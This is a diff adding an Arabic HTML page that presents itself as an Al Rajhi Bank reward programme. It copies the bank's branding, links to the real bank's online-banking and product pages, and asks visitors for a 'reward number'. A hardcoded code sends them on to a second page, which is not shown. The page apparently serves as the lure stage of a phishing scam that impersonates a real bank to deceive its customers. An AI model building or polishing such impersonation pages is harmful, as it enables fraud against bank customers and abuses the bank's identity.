@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="img/favicon-32x32.png" rel="shortcut icon" />
+    <title>اهلا بك في برنامج مكافاة | مصرف الراجحي</title>
+    <style>
+        @font-face {
+font-family: 'ArabicKufi';
+src: url('path/to/arabic-kufi-font.woff2') format('woff2'),
+url('path/to/arabic-kufi-font.woff') format('woff');
+}
+        /* الأيقونات */
+        .fas {
+            margin-right: 5px;
+        }
+
+        /* باقي الأنماط الأصلية */
+        body {
+            font-family: 'ArabicKufi', Arial, sans-serif;
+            direction: rtl;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+    position: sticky;
+    top: 0;
+    background-color: #2225d1;
+    color: #fff;
+    height: 130px;
+    display: flex;
+    align-items: center;
+    padding: 0 20px;
+        }
+
+        .logo {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+        
+        }
+    
+        .logo img {
+            width: 60px;
+            height : 60px;
+            margin-right: 20px;
+        }
+
+        header .logo1 {
+            margin: 0 auto;
+            display: flex;
+        }
+
+        header .logo1 img {
+            width: 60px;
+            height: 60px;
+            margin-left:50px;
+        }
+
+        .login-button {
+            margin-left: 20px;
+        }
+
+        .login-button a {
+            border: none;
+            background-color: rgb(34, 165, 252); /* تعيين لون الباكغراوند مع شفافية هنا */
+           
+            color: rgb(251, 250, 252);
+            padding: 30px 50px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 25px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+            border-radius: 100px; /* تعديل تفاف زوايا الباك غراوند هنا */
+        }
+
+        .login-button:hover {
+            color: rgb(115, 17, 228); /* تغيير لون كلمة تسجيل الدخول عند وضع المؤشر عليها */
+        }
+
+        .bottom-nav {
+            position: fixed;
+            bottom: 100px;
+            left: 12px;
+            width: 94%;
+            height: 127px; /* تعديل ارتفاع اللباكغراوند هنا */
+            background-color: rgba(34, 165, 252, 0.9); /* تعيين لون الباكغراوند مع شفافية هنا */
+            color: #fff;
+            padding: 10px;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            border-radius: 100px; /* تعديل تفاف زوايا الباك غراوند هنا */
+            
+        }
+
+        .bottom-nav ul {
+            display: flex;
+            justify-content: center;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .bottom-nav li {
+            margin: 0 25px;
+        }
+
+        .bottom-nav a {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            color: #fff;
+            text-decoration: none;
+            font-size: 45px;
+        }
+        
+        
+        .bottom-nav a:hover {
+            color: #413f3f;
+        } 
+        
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 12vh;
+        }
+
+        .input-field {
+            padding: 10px;
+            margin-bottom: 10px;
+            width: 200px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .submit-button {
+            padding: 10px 20px;
+            background-color: #2427f1;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+}
+
+hr {
+    border-color: rgb(255, 254, 254);
+    border-width: 0.1px;
+    width: 75%;
+        }
+
+.form-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 12vh;
+        }
+
+        .input-field {
+            font-size: 40px;
+            padding: 30px;
+            margin-bottom: 30px;
+            width: 500px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            text-transform: uppercase;
+
+        }
+
+        .submit-button {
+          
+        font-size: 25px;
+          padding: 22px 60px;
+            background-color: #2427f1;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+}
+.text1 {
+
+font-family: Arial, sans-serif;
+font-size: 40px;
+font-weight: bold;
+color: rgb(3, 3, 3);
+text-decoration: none;
+margin-right: 150px; /* تعديل الهامش الأيسر هنا */
+
+
+}
+.image-frame {
+            border: 2px solid rgb(236, 7, 7); /* سمك الإطار ولونه */
+            padding: 10px; /* تباعد داخلي للإطار */
+            border-radius: 5px; /* إضافة زوايا مستديرة للإطار */
+        }
+        @keyframes fadeOut {
+    0% {
+        opacity: 1;
+    }
+    50% {
+        opacity: 0;
+    }
+    100% {
+        opacity: 1;
+        display: none;
+    }
+}
+
+.logo6 {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    animation: fadeIn 1s forwards;
+}
+
+.content {
+    visibility: hidden;
+}
+
+@keyframes fadeIn {
+    0% {
+        opacity: 0;
+    }
+    100% {
+        opacity: 1;
+    }
+
+    </style>
+    </head>
+<body>
+    <script>
+        function checkReward() {
+            var rewardNumber = document.getElementById('reward-number').value;
+
+            if (rewardNumber === '714767') {
+                window.location.href = 'mokafaa2.html';
+            } else {
+                alert('خطأ في رقم المكافأة');
+            }
+        }
+    </script>
+
+
+
+
+<div class="logo6">
+    <img src="img/lllo.png" alt="اسم اللوغو">
+</div>
+
+<div class="content">
+    <!-- محتوى الصفحة هنا -->
+
+
+
+    <header>
+        <div class="logo">
+            <img src="img/mff.png" alt="لوغو">
+        </div>
+
+        <div class="logo1">
+            <img src="img/logo-arb.png" alt="لوغو ثاني" >
+        </div>
+
+        
+        <div class="login-button">
+            <a href="https://onlinebanking.alrajhibank.com.sa/OnlineBanking/">تسجيل الدخول</a>
+        </div>
+    </header>
+    <hr>
+    <img src="img/img1.jpg" alt="" width="850" class="image-frame" >
+    <p class="text1">  ادخل رقم المكافأة للتحقق منها   </p>
+    
+    
+    <div class="form-container">
+        <input type="text" id="reward-number" class="input-field" placeholder="رقم المكافأة">
+        <button class="submit-button" onclick="checkReward()">تحقق</button>
+        <div class="error-message" id="error-message"></div>
+    </div><br><br><br>
+    <img src="img/img2.jpg" alt=""   width="850"  class="image-frame">
+    <br>
+    <img src="img/img3.jpg" alt="" width="850" class="image-frame">
+    <img src="img/img4.jpg" alt=""   width="850" class="image-frame">
+    <img src="img/img5.png" alt=""  class="image-frame">
+<div  class="bottom-nav">
+        <ul>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Accounts"><i class="fas fa-user"></i> <span>الحسابات</span></a></li>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Cards"><i class="fas fa-credit-card"></i> <span>البطاقات</span></a></li>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Finance"><i class="fas fa-money-bill"></i> <span>التمويل</span></a></li>
+            <li><a href="https://www.alrajhibank.com.sa/Personal/Insurance"><i class="fas fa-shield-alt"></i> <span>التأمين</span></a></li>
+        </ul>
+        </div>
+   
+</div>
+<script>
+    const logoElement = document.querySelector('.logo6');
+    const contentElement = document.querySelector('.content');
+
+    setTimeout(function() {
+        logoElement.style.animation = 'fadeOut 1s forwards';
+        setTimeout(function() {
+            logoElement.style.display = 'none';
+            contentElement.style.visibility = 'visible';
+        }, 1000); // انتظر لمدة ثانية بعد الانتهاء من الوميض قبل إظهار محتوى الصفحة
+    }, 4000);
+
+</script>
+    </body>
+</html>
